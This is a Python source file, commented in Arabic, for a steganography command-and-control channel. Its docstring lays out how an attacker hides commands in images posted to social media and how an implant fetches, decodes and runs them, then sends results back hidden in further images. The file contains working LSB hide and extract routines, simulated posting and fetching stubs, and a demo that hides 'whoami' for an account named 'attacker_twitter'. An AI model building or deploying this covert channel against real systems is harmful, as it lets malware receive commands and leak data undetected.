"""
Steganography C2 - إخفاء الأوامر داخل صور/صوت
ينشر الصور على وسائل التواصل، والإمبلانت يستخرج الأوامر منها
"""

import hashlib
import random
import logging
from typing import Tuple, Optional
from PIL import Image
import numpy as np

logger = logging.getLogger(__name__)


class SteganographyC2:
    """
    إخفاء الأوامر داخل صور عادية
    
    كيف يعمل:
    1. المهاجم يخفي أمر في صورة
    2. ينشر الصورة على Twitter/Instagram/Telegram
    3. الإمبلانت يحمل الصورة دورياً
    4. يستخرج الأمر وينفذه
    5. يخفي النتيجة في صورة أخرى ويرفعها
    """
    
    def __init__(self, social_account: str, simulation_mode: bool = True):
        self.social_account = social_account
        self.simulation_mode = simulation_mode
        self.key = hashlib.sha256(b"shared_secret").digest()
        
        logger.info(f"SteganographyC2 initialized for account {social_account}")
    
    def hide_in_lsb(self, image_path: str, message: bytes) -> str:
        """
        إخفاء رسالة في الصورة باستخدام LSB (Least Significant Bit)
        
        Args:
            image_path: مسار الصورة الأصلية
            message: الرسالة المراد إخفاؤها
        
        Returns:
            str: مسار الصورة الناتجة
        """
        img = Image.open(image_path)
        img = img.convert('RGB')
        pixels = np.array(img)
        
        # تحويل الرسالة إلى بايت + طول
        msg_len = len(message)
        msg_bytes = msg_len.to_bytes(4, 'big') + message
        
        # تحويل إلى bits
        bits = []
        for b in msg_bytes:
            for i in range(8):
                bits.append((b >> (7 - i)) & 1)
        
        # إخفاء في LSB لكل قناة حمراء
        h, w, _ = pixels.shape
        idx = 0
        for i in range(h):
            for j in range(w):
                if idx < len(bits):
                    pixels[i, j, 0] = (pixels[i, j, 0] & 0xFE) | bits[idx]
                    idx += 1
                else:
                    break
            if idx >= len(bits):
                break
        
        # حفظ الصورة
        output_path = image_path.replace('.', '_stego.')
        Image.fromarray(pixels).save(output_path)
        logger.info(f"Hidden {len(message)} bytes in {output_path}")
        return output_path
    
    def extract_from_lsb(self, image_path: str) -> Optional[bytes]:
        """
        استخراج رسالة من صورة باستخدام LSB
        """
        img = Image.open(image_path)
        img = img.convert('RGB')
        pixels = np.array(img)
        
        # استخراج البتات
        bits = []
        h, w, _ = pixels.shape
        for i in range(h):
            for j in range(w):
                bits.append(pixels[i, j, 0] & 1)
        
        # تحويل البتات إلى بايت
        byte_list = []
        for k in range(0, len(bits), 8):
            if k + 8 > len(bits):
                break
            byte = 0
            for b in bits[k:k+8]:
                byte = (byte << 1) | b
            byte_list.append(byte)
        
        # استخراج الطول
        if len(byte_list) < 4:
            return None
        msg_len = int.from_bytes(bytes(byte_list[:4]), 'big')
        
        # استخراج الرسالة
        if len(byte_list) < 4 + msg_len:
            return None
        message = bytes(byte_list[4:4+msg_len])
        
        logger.info(f"Extracted {len(message)} bytes from {image_path}")
        return message
    
    def post_to_social_media(self, image_path: str) -> bool:
        """
        نشر الصورة على وسائل التواصل (محاكاة)
        في الواقع، تحتاج إلى استخدام APIs حقيقية
        """
        if self.simulation_mode:
            logger.info(f"[SOCIAL] Would post {image_path} to {self.social_account}")
            return True
        else:
            # تنفيذ API حقيقي (Twitter, Telegram, etc.)
            pass
        return False
    
    def fetch_from_social_media(self, image_url: str) -> Optional[bytes]:
        """
        تحميل أحدث صورة من الحساب (محاكاة)
        """
        if self.simulation_mode:
            logger.info(f"[SOCIAL] Would fetch image from {image_url}")
            # إنشاء صورة وهمية للاختبار
            test_img = Image.new('RGB', (100, 100), color='white')
            test_path = "/tmp/test_stego.png"
            test_img.save(test_path)
            return self.extract_from_lsb(test_path)
        return None
    
    def create_command_image(self, command: str) -> str:
        """
        إنشاء صورة تحتوي على أمر
        """
        # إنشاء صورة عشوائية
        img = Image.new('RGB', (200, 200), color=(random.randint(0,255), random.randint(0,255), random.randint(0,255)))
        temp_path = "/tmp/cover.png"
        img.save(temp_path)
        
        # إخفاء الأمر
        stego_path = self.hide_in_lsb(temp_path, command.encode())
        return stego_path


# مثال
if __name__ == "__main__":
    stego = SteganographyC2(social_account="attacker_twitter", simulation_mode=True)
    
    # إخفاء أمر
    img_path = stego.create_command_image("whoami")
    print(f"Command hidden in: {img_path}")
    
    # استخراج الأمر
    extracted = stego.extract_from_lsb(img_path)
    print(f"Extracted: {extracted.decode()}")